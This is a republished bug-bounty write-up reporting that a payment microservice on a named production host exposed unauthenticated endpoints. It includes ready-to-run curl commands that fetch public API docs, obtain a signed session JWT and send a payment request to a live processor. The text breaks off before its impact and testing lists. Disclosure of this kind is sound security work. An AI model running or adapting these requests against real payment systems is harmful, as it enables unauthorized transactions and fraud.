# Bypassing Access Controls

- **Source URL:** https://medium.com/@mgsa112233/bypassing-access-controls-how-i-found-an-unauthenticated-payment-processing-endpoint-cvss-8-5-02d972bcd57c
- **Fetched from:** https://medium.com/@mgsa112233/bypassing-access-controls-how-i-found-an-unauthenticated-payment-processing-endpoint-cvss-8-5-02d972bcd57c?source=rss-de788fc65c12------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14917 (id 14917)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** jimmy / Fri, 18 Sep 2026 19:06:59 GMT

During recent web application security research, I identified a critical vulnerability on a production payment microservice (payments.itlp.c1.vanguard.com). The application exposed multiple critical endpoints that processed real Cybersource payment operations without any server-side authentication.

The sole mechanism protecting these endpoints was a CORS Origin header—a browser-only restriction that is trivially bypassed using command-line tools like curl.

The OpenAPI documentation was completely public without requiring authentication, exposing internal routes (ISA, JISA, GA, SIPP), vgNumber formats, and 3DS flows:

Bash

curl -sS 'https://payments.itlp.c1.vanguard.com/v3/api-docs'

Sending an unauthenticated POST request to the microforms session endpoint successfully returned a live, signed RS256 captureContext JWT containing the merchant’s JWK and allowed card networks (VISA, MASTERCARD, MAESTRO):

curl -sS \

-H 'Content-Type: application/json' \

-H 'Origin: https://payments.itlp.c1.vanguard.com' \

-d '{"amount":"10.00","currency":"GBP","product":"ISA"}' \

'https://payments.itlp.c1.vanguard.com/api/v1/microforms/session'

Forwarding a payment request directly to the processor without any user session or authentication token returned real, valid transaction IDs from Cybersource:

curl -sS \

-H 'Content-Type: application/json' \

-d '{

"transientToken": "not-a-real-token",

"amount": "1.00",

"currency": "GBP",

"referenceNumber": "H1-RESEARCH-NO-CHARGE",

"product": "ISA",

"vgNumber": "VG000000-001",

"paymentRouteType": "Single Payment"

}' \

'https://payments.itlp.c1.vanguard.com/api/v1/microforms/process-payment'

*Response:* Real transaction IDs returned (e.g., 7892376939806836504896), confirming the endpoint successfully communicated with the live Cybersource gateway.

An unauthenticated attacker could leverage these flaws to:

As ethical security researchers, responsible testing is our top priority:
